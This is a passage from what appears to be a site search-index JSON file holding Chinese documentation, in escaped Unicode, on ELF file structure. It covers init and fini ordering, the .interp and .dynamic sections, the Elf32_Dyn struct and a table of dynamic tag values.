\u4f9d\u8d56\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u4ee3\u7801\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u76ee\u6807\u6587\u4ef6 A \u4f9d\u8d56\u4e8e\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6 B\uff0c\u90a3\u4e48 B \u5c31\u4f1a\u5728 A \u7684\u4f9d\u8d56\u5217\u8868\u4e2d\uff0c\u8fd9\u4f1a\u88ab\u8bb0\u5f55\u5728\u52a8\u6001\u7ed3\u6784\u7684 DT_NEEDED \u4e2d\u3002\u5faa\u73af\u4f9d\u8d56\u7684\u521d\u59cb\u5316\u662f\u672a\u88ab\u5b9a\u4e49\u7684\u3002  \u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u901a\u8fc7\u9012\u5f52\u6bcf\u4e00\u4e2a\u88ab\u4f9d\u8d56\u7684\u8868\u9879\u6765\u5b8c\u6210\u3002\u53ea\u6709\u5f53\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4f9d\u8d56\u7684\u6240\u6709\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u5904\u7406\u5b8c\u81ea\u5df1\u7684\u4f9d\u8d56\u540e\uff0c\u8fd9\u4e2a\u76ee\u6807\u6587\u4ef6\u624d\u4f1a\u6267\u884c\u521d\u59cb\u5316\u4ee3\u7801\u3002  \u4e0b\u9762\u7684\u4f8b\u5b50\u89e3\u91ca\u4e86\u4e24\u79cd\u6b63\u786e\u7684\u53ef\u4ee5\u7528\u6765\u751f\u6210\u7ed9\u5b9a\u4f8b\u5b50\u7684\u987a\u5e8f\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0ca.out \u4f9d\u8d56\u4e8eb\uff0cd \u4ee5\u53ca e\u3002b\u4f9d\u8d56\u4e8ed \u548c f\uff0c\u5e76\u4e14 d \u4f9d\u8d56\u4e8e e \u548c g\u3002\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u753b\u51fa\u5982\u4e0b\u7684\u4f9d\u8d56\u56fe\u3002\u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u8bf4\u7684\u7b97\u6cd5\uff0c\u5c06\u5141\u8bb8\u6211\u4eec\u6309\u7167\u5982\u4e0b\u7684\u987a\u5e8f\u8fdb\u884c\u521d\u59cb\u5316\u3002   \u7c7b\u4f3c\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e5f\u4f1a\u6709\u7ed3\u675f\u7684\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728\u8fdb\u7a0b\u5b8c\u6210\u81ea\u5df1\u7684\u7ec8\u6b62\u5e8f\u5217\u65f6\u901a\u8fc7 atexit \u673a\u5236\u6765\u6267\u884c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u8c03\u7528\u7ec8\u6b62\u51fd\u6570\u7684\u987a\u5e8f\u6070\u597d\u4e0e\u4e0a\u9762\u521d\u59cb\u5316\u7684\u987a\u5e8f\u76f8\u53cd\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u786e\u4fdd\u5b83\u53ea\u4f1a\u6267\u884c\u521d\u59cb\u5316\u6216\u8005\u7ec8\u6b62\u51fd\u6570\u6700\u591a\u4e00\u6b21\u3002  \u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u8fc7\u52a8\u6001\u7ed3\u6784\u4e2d\u7684 DT_INIT \u548c DT_FINI \u6765\u6307\u5b9a\u5b83\u4eec\u7684\u521d\u59cb\u5316\u4ee5\u53ca\u7ed3\u675f\u51fd\u6570\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728.init\u8282\u4e0e.fini\u8282\u4e2d\u3002  \u6ce8\u610f\uff1a   \u5c3d\u7ba1ateixt\u7ec8\u6b62\u5904\u7406\u51fd\u6570\u901a\u5e38\u6765\u8bf4\u4f1a\u88ab\u6267\u884c\uff0c\u4f46\u5b83\u5e76\u4e0d\u4f1a\u4fdd\u8bc1\u5728\u7a0b\u5e8f\u6d88\u4ea1\u65f6\u88ab\u6267\u884c\u3002\u66f4\u7279\u6b8a\u7684\u662f\uff0c\u5982\u679c\u7a0b\u5e8f\u8c03\u7528\u4e86_exit\u51fd\u6570\u6216\u8005\u8fdb\u7a0b\u7531\u4e8e\u63a5\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7\u540e\u6d88\u4ea1\u4e86\uff0c\u90a3\u4e48\u5b83\u5c06\u4e0d\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u51fd\u6570\u3002   \u52a8\u6001\u94fe\u63a5\u5668\u5e76\u4e0d\u8d1f\u8d23\u8c03\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684 .init \u8282\u6216\u8005\u5229\u7528 atexit \u6ce8\u518c\u53ef\u6267\u884c\u6587\u4ef6\u7684 .fini \u8282\u3002\u7531\u7528\u6237\u901a\u8fc7 atexit \u673a\u5236\u6307\u5b9a\u7684\u7ec8\u6b62\u51fd\u6570\u5fc5\u987b\u5728\u6240\u6709\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u7ed3\u675f\u51fd\u6570\u524d\u6267\u884c\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/executable/elf/elf_structure/#init-init_array", 
            "text": "\u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u521d\u59cb\u5316\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5728\u5f00\u59cb\u8c03\u7528\u4e3b\u7a0b\u5e8f\u5165\u53e3\uff08\u901a\u5e38\u6307 C \u8bed\u8a00\u7684 main \u51fd\u6570\uff09\u524d\u6267\u884c\u8fd9\u4e9b\u4ee3\u7801\u3002", 
            "title": ".init &amp; .init_array"
        }, 
        {
            "location": "/executable/elf/elf_structure/#text", 
            "text": "\u6b64\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6307\u4ee4\u3002", 
            "title": ".text"
        }, 
        {
            "location": "/executable/elf/elf_structure/#fini-fini_array", 
            "text": "\u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u7684\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u7ec8\u6b62\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\u65f6\uff0c\u7cfb\u7edf\u5c06\u6267\u884c\u8fd9\u91cc\u7684\u4ee3\u7801\u3002", 
            "title": ".fini &amp; .fini_array"
        }, 
        {
            "location": "/executable/elf/elf_structure/#dynamic-related-sections", 
            "text": "", 
            "title": "Dynamic Related Sections"
        }, 
        {
            "location": "/executable/elf/elf_structure/#interp-section", 
            "text": "\u4e00\u822c\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u5177\u6709\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u7a0b\u5e8f\u5934\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u6765\u52a0\u8f7d\u7a0b\u5e8f\u4e2d\u7684\u6bb5\u3002\u8fd9\u4e2a\u8282\u5305\u542b\u4e86\u7a0b\u5e8f\u5bf9\u5e94\u7684\u89e3\u91ca\u5668\u3002\u5728 exec (BA_OS) \u8fc7\u7a0b\u4e2d\uff0c\u7cfb\u7edf\u4f1a\u4ece\u8be5\u8282\u4e2d\u63d0\u53d6\u5bf9\u5e94\u89e3\u91ca\u5668\u7684\u8def\u5f84\uff0c\u5e76\u6839\u636e\u89e3\u91ca\u5668\u6587\u4ef6\u7684\u6bb5\u521b\u5efa\u521d\u59cb\u65f6\u7684\u7a0b\u5e8f\u955c\u50cf\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7cfb\u7edf\u5e76\u4e0d\u4f7f\u7528\u7ed9\u5b9a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u955c\u50cf\uff0c\u800c\u4f1a\u9996\u5148\u4e3a\u89e3\u91ca\u5668\u6784\u9020\u72ec\u7acb\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u89e3\u91ca\u5668\u9700\u8981\u4ece\u7cfb\u7edf\u5904\u83b7\u53d6\u63a7\u5236\u6743\uff0c\u7136\u540e\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u6267\u884c\u73af\u5883\u3002  \u89e3\u91ca\u5668\u53ef\u80fd\u6709\u4e24\u79cd\u65b9\u5f0f\u83b7\u53d6\u63a7\u5236\u6743\u3002   \u5b83\u53ef\u4ee5\u63a5\u6536\u4e00\u4e2a\u6307\u5411\u6587\u4ef6\u5934\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u8bfb\u53d6\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5b83\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u6765\u8bfb\u53d6\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002  \u6709\u65f6\u5019\u6839\u636e\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u7684\u4e0d\u540c\uff0c\u7cfb\u7edf\u6709\u53ef\u80fd\u4e0d\u4f1a\u628a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7ed9\u89e3\u91ca\u5668\uff0c\u800c\u662f\u4f1a\u76f4\u63a5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u867d\u7136\u6587\u4ef6\u63cf\u8ff0\u7b26\u53ef\u80fd\u4f1a\u51fa\u73b0\u5f02\u5e38\uff0c\u4f46\u662f\u89e3\u91ca\u5668\u7684\u521d\u59cb\u72b6\u6001\u4ecd\u7136\u4f1a\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6536\u5230\u7684\u76f8\u5339\u914d\uff0c\u89e3\u91ca\u5668\u672c\u8eab\u4e0d\u9700\u8981\u518d\u6709\u4e00\u4e2a\u89e3\u91ca\u5668\u3002\u89e3\u91ca\u5668\u672c\u8eab\u53ef\u80fd\u662f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6216\u8005\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002   \u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u95ee\u9898   \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u6b63\u5e38\u60c5\u51b5\u4e0b\uff09\u88ab\u52a0\u8f7d\u4e3a\u5730\u5740\u72ec\u7acb\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5b83\u7684\u5730\u5740\u4f1a\u6709\u6240\u4e0d\u540c\u3002\u7cfb\u7edf\u901a\u8fc7 mmap (KE_OS) \u4ee5\u53ca\u4e00\u4e9b\u76f8\u5173\u7684\u64cd\u4f5c\u6765\u521b\u5efa\u52a8\u6001\u6bb5\u4e2d\u7684\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5730\u5740\u901a\u5e38\u6765\u8bf4\u4e0d\u4f1a\u548c\u539f\u6765\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u539f\u6709\u5730\u5740\u51b2\u7a81\u3002  \u53ef\u6267\u884c\u6587\u4ef6\u4e00\u822c\u4f1a\u88ab\u52a0\u8f7d\u5230\u56fa\u5b9a\u7684\u5730\u5740\u3002\u7cfb\u7edf\u901a\u8fc7\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u865a\u62df\u5730\u5740\u6765\u521b\u5efa\u5bf9\u5e94\u7684\u6bb5\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u89e3\u91ca\u5668\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u548c\u7b2c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u51b2\u7a81\u3002\u89e3\u91ca\u5668\u6709\u8d23\u4efb\u6765\u89e3\u51b3\u76f8\u5e94\u7684\u51b2\u7a81\u3002", 
            "title": ".interp section"
        }, 
        {
            "location": "/executable/elf/elf_structure/#dynamic", 
            "text": "\u5982\u679c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u53c2\u4e0e\u5230\u52a8\u6001\u94fe\u63a5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u90a3\u4e48\u5b83\u7684\u7a0b\u5e8f\u5934\u90e8\u8868\u5c06\u4f1a\u5305\u542b\u4e00\u4e2a\u7c7b\u578b\u4e3a PT_DYNAMIC \u7684\u5143\u7d20\u3002\u8fd9\u4e2a\u6bb5\u5305\u542b\u4e86 .dynamic \u8282\uff0c\u5176\u5b9e\u8fd9\u4e2a\u6bb5\u5c31\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u952e\u503c\u5bf9\u3002  \u52a8\u6001\u8282\u4e00\u822c\u4fdd\u5b58\u4e86 ELF \u6587\u4ef6\u7684\u5982\u4e0b\u4fe1\u606f   \u4f9d\u8d56\u4e8e\u54ea\u4e9b\u52a8\u6001\u5e93  \u52a8\u6001\u7b26\u53f7\u8282\u4fe1\u606f  \u52a8\u6001\u5b57\u7b26\u4e32\u8282\u4fe1\u606f   \u6211\u4eec\u4e00\u822c\u4f7f\u7528 _DYNAMIC \u7b26\u53f7\u6765\u6807\u8bb0\u8fd9\u4e2a\u8282\uff0c\u5b83\u7684\u7ed3\u6784\u5982\u4e0b  typedef struct {\n    Elf32_Sword     d_tag;\n    union {\n        Elf32_Word  d_val;\n        Elf32_Addr  d_ptr;\n    } d_un;\n} Elf32_Dyn;\nextern Elf32_Dyn_DYNAMIC[];  \u5176\u4e2d\uff0cd_tag \u7684\u53d6\u503c\u51b3\u5b9a\u4e86\u8be5\u5982\u4f55\u89e3\u91ca d_un\u3002   d_val  \u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u53ef\u4ee5\u6709\u591a\u79cd\u610f\u601d\u3002    d_ptr  \u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u7a0b\u5e8f\u7684\u865a\u62df\u5730\u5740\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u4e00\u4e2a\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u548c\u5185\u5b58\u7684\u865a\u62df\u5730\u5740\u4e0d\u5339\u914d\u3002\u5f53\u89e3\u6790\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u6839\u636e\u539f\u59cb\u6587\u4ef6\u7684\u503c\u4ee5\u53ca\u5185\u5b58\u7684\u57fa\u5730\u5740\u6765\u8ba1\u7b97\u771f\u6b63\u7684\u5730\u5740\u3002\u4e3a\u4e86\u4fdd\u6301\u4e00\u81f4\u6027\uff0c\u6587\u4ef6\u4e2d\u5e76\u4e0d\u4f1a\u5305\u542b\u91cd\u5b9a\u4f4d\u5165\u53e3\u6765\"\u7ea0\u6b63\"\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u3002     \u4e0b\u8868\u603b\u7ed3\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 d_tag \u7684\u9700\u6c42 \u3002\u5982\u679c\u4e00\u4e2a tag \u88ab\u6807\u8bb0\u4e3a\"mandatory\"\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a TIS ELF conforming \u7684\u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u52a8\u6001\u94fe\u63a5\u6570\u7ec4\u5fc5\u987b\u5305\u542b\u5bf9\u5e94\u5165\u53e3\u7684\u7c7b\u578b\u3002\u540c\u6837\u7684\uff0c\u201coptional\u201d\u610f\u5473\u7740\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6709\u6ca1\u6709\u3002     \u540d\u79f0  \u6570\u503c  d_un  \u53ef\u6267\u884c  \u5171\u4eab \u76ee\u6807  \u8bf4\u660e      DT_NULL  0  \u5ffd\u7565  \u5fc5\u9700  \u5fc5\u9700  \u6807\u5fd7\u7740 _DYNAMIC \u6570\u7ec4\u7684\u672b\u7aef\u3002    DT_NEEDED  1  d_val  \u53ef\u9009  \u53ef\u9009  \u5305\u542b\u4ee5NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u8be5\u5b57\u7b26\u4e32\u7ed9\u51fa\u67d0\u4e2a\u9700\u8981\u7684\u5e93\u7684\u540d\u79f0\u3002\u6240\u4f7f\u7528\u7684\u7d22\u5f15\u4e3aDT_STRTAB\u7684\u4e0b\u6807\u3002\u52a8\u6001\u6570\u7ec4\u4e2d\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u6807\u8bb0\u3002\u8fd9\u4e9b\u9879\u5728\u8fd9\u79cd\u7c7b\u578b\u6807\u8bb0\u4e2d\u7684\u76f8\u5bf9\u987a\u5e8f\u6bd4\u8f83\u91cd\u8981\u3002\u4f46\u662f\u4e0e\u5176\u5b83\u7684\u6807\u8bb0\u4e4b\u524d\u7684\u987a\u5e8f\u5012\u65e0\u6240\u8c13\u3002\u5bf9\u5e94\u7684\u6bb5\u4e3a.gnu.version_r\u3002    DT_PLTRELSZ  2  d_val  \u53ef\u9009  \u53ef\u9009  \u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u76f8\u5173\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u603b\u7684\u5927\u5c0f\u3002\u5982\u679c\u5b58\u5728DT_JMPREL\u7c7b\u578b\u7684\u9879\uff0c\u90a3\u4e48DT_PLTRELSZ\u4e5f\u5fc5\u987b\u5b58\u5728\u3002    DT_PLTGOT  3  d_ptr  \u53ef\u9009  \u53ef\u9009  \u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u6216\u8005\u5168\u5c40\u504f\u79fb\u8868\u76f8\u5173\u8054\u7684\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u6bb5.got.plt    DT_HASH  4  d_ptr  \u5fc5\u9700  \u5fc5\u9700  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\u7684\u5730\u5740\u3002\u6b64\u54c8\u5e0c\u8868\u6307\u7684\u662f\u88ab DT_SYMTAB \u5f15\u7528\u7684\u7b26\u53f7\u8868\u3002    DT_STRTAB  5  d_ptr  \u5fc5\u9700  \u5fc5\u9700  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u5730\u5740\u3002\u7b26\u53f7\u540d\u3001\u5e93\u540d\u3001\u548c\u5176\u5b83\u5b57\u7b26\u4e32\u90fd\u5305\u542b\u5728\u6b64\u8868\u4e2d\u3002\u5bf9\u5e94\u7684\u8282\u7684\u540d\u5b57\u5e94\u8be5\u662f.dynstr\u3002    DT_SYMTAB  6  d_ptr  \u5fc5\u9700  \u5fc5\u9700  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u7b26\u53f7\u8868\u7684\u5730\u5740\u3002\u5bf9 32 \u4f4d\u7684\u6587\u4ef6\u800c\u8a00\uff0c\u8fd9\u4e2a\u7b26\u53f7\u8868\u4e2d\u7684\u6761\u76ee\u7684\u7c7b\u578b\u4e3a Elf32_Sym\u3002    DT_RELA  7  d_ptr  \u5fc5\u9700  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u7684\u5730\u5740\u3002\u6b64\u8868\u4e2d\u7684\u5143\u7d20\u5305\u542b\u663e\u5f0f\u7684\u8865\u9f50\uff0c\u4f8b\u5982 32 \u4f4d\u6587\u4ef6\u4e2d\u7684 Elf32_Rela\u3002\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002\u5728\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u91cd\u5b9a\u4f4d\u8868\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u8fd9\u4e9b\u8282\u533a\u8fde\u63a5\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u8868\u3002\u5c3d\u7ba1\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u8fd9\u4e9b\u8282\u533a\u76f8\u4e92\u72ec\u7acb\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u628a\u5b83\u4eec\u89c6\u4e3a\u4e00\u4e2a\u8868\u3002\u5728\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u521b\u5efa\u8fdb\u7a0b\u6620\u50cf\u6216\u8005\u5411\u4e00\u4e2a\u8fdb\u7a0b\u6620\u50cf\u4e2d\u6dfb\u52a0\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u65f6\uff0c\u8981\u8bfb\u53d6\u91cd\u5b9a\u4f4d\u8868\u5e76\u6267\u884c\u76f8\u5173\u7684\u52a8\u4f5c\u3002\u5982\u679c\u6b64\u5143\u7d20\u5b58\u5728\uff0c\u52a8\u6001\u7ed3\u6784\u4f53\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELASZ \u548c DT_RELAENT \u5143\u7d20\u3002\u5982\u679c\u5bf9\u4e8e\u67d0\u4e2a\u6587\u4ef6\u6765\u8bf4\uff0c\u91cd\u5b9a\u4f4d\u662f\u5fc5\u9700\u7684\u8bdd\uff0c\u90a3\u4e48 DT_RELA \u6216\u8005 DT_REL \u90fd\u53ef\u80fd\u5b58\u5728\u3002    DT_RELASZ  8  d_val  \u5fc5\u9700  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002    DT_RELAENT  9  d_val  \u5fc5\u9700  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002    DT_STRSZ  10  d_val  \u5fc5\u9700  \u5fc5\u9700  \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u5b57\u7b26\u4e32\u8868\u7684\u5b57\u8282\u5927\u5c0f\uff0c\u6309\u5b57\u8282\u6570\u8ba1\u7b97\u3002    DT_SYMENT  11  d_val  \u5fc5\u9700  \u5fc5\u9700  \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7b26\u53f7\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002    DT_INIT  12  d_ptr  \u53ef\u9009  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u521d\u59cb\u5316\u51fd\u6570\u7684\u5730\u5740\u3002    DT_FINI  13  d_ptr  \u53ef\u9009  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7ed3\u675f\u51fd\u6570\uff08Termination Function\uff09\u7684\u5730\u5740\u3002    DT_SONAME  14  d_val  \u5ffd\u7565  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u4e00\u4e2a\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u7684\u540d\u79f0\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002    DT_RPATH  15  d_val  \u53ef\u9009  \u5ffd\u7565  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u641c\u7d22\u5e93\u65f6\u4f7f\u7528\u7684\u641c\u7d22\u8def\u5f84\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002    DT_SYMBOLIC  16  \u5ffd\u7565  \u5ffd\u7565  \u53ef\u9009  \u5982\u679c\u8fd9\u79cd\u7c7b\u578b\u8868\u9879\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u5e93\u4e2d\uff0c\u90a3\u4e48\u8fd9\u5c06\u4f1a\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u7b26\u53f7\u89e3\u6790\u7b97\u6cd5\u3002\u52a8\u6001\u8fde\u63a5\u5668\u5c06\u9996\u5148\u9009\u62e9\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u672c\u8eab\u5f00\u59cb\u641c\u7d22\u7b26\u53f7\uff0c\u53ea\u6709\u5728\u641c\u7d22\u5931\u8d25\u65f6\uff0c\u624d\u4f1a\u9009\u62e9\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u7b26\u53f7\u3002    DT_REL  17  d_ptr  \u5fc5\u9700  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u4e0e DT_RELA\u7c7b\u578b\u7684\u8868\u9879\u7c7b\u4f3c\uff0c\u53ea\u662f\u5176\u8868\u683c\u4e2d\u5305\u542b\u9690\u5f0f\u7684\u8865\u9f50\uff0c\u5bf9 32 \u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u5c31\u662f Elf32_Rel\u3002\u5982\u679cELF\u6587\u4ef6\u4e2d\u5305\u542b\u6b64\u5143\u7d20\uff0c\u90a3\u4e48\u52a8\u6001\u7ed3\u6784\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELSZ \u548c DT_RELENT \u7c7b\u578b\u7684\u5143\u7d20\u3002    DT_RELSZ  18  d_val  \u5fc5\u9700  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002    DT_RELENT  19  d_val  \u5fc5\u9700  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002    DT_PLTREL  20  d_val  \u53ef\u9009  \u53ef\u9009  \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u6240\u5f15\u7528\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u5730\u5740\u3002\u6839\u636e\u5177\u4f53\u60c5\u51b5\uff0c d_val \u5bf9\u5e94\u7684\u5730\u5740\u53ef\u80fd\u5305\u542b DT_REL \u6216\u8005  DT_RELA\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u6240\u6709\u91cd\u5b9a\u4f4d\u90fd\u5fc5\u987b\u91c7\u7528\u76f8\u540c\u7684\u91cd\u5b9a\u4f4d\u65b9\u5f0f\u3002    DT_DEBUG  21  d_ptr  \u53ef\u9009  \u5ffd\u7565  \u6b64\u7c7b\u578b\u8868\u9879\u7528\u4e8e\u8c03\u8bd5\u3002ABI \u672a\u89c4\u5b9a\u5176\u5185\u5bb9\uff0c\u8bbf\u95ee\u8fd9\u4e9b\u6761\u76ee\u7684\u7a0b\u5e8f\u53ef\u80fd\u4e0e ABI \u4e0d\u517c\u5bb9\u3002    DT_TEXTREL  22  \u5ffd\u7565  \u53ef\u9009  \u53ef\u9009  